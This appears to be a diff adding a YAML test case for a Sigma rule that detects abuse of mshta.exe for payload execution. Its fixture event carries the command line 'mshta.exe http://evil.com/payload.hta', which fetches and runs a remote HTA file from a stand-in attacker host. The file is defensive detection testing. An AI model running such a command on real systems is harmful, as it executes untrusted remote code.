@@ -1,0 +1,19 @@
+test_case:
+  name: "MSHTA Proxy Execution"
+  description: "Tests detection of mshta abuse for payload execution"
+  rule: "execution/mshta_execution.yml"
+  rule_type: sigma
+  events:
+    - type: process_create
+      os_type: windows
+      data:
+        path: "C:\\Windows\\System32\\mshta.exe"
+        cmdline: "mshta.exe http://evil.com/payload.hta"
+        parent_path: "C:\\Windows\\System32\\cmd.exe"
+        user: "WORKSTATION\\user"
+        pid: 5892
+        ppid: 2048
+  expected: match
+  expected_severity: high
+  expected_mitre: ["T1218.005"]
+  tags: ["execution", "mshta", "positive"]
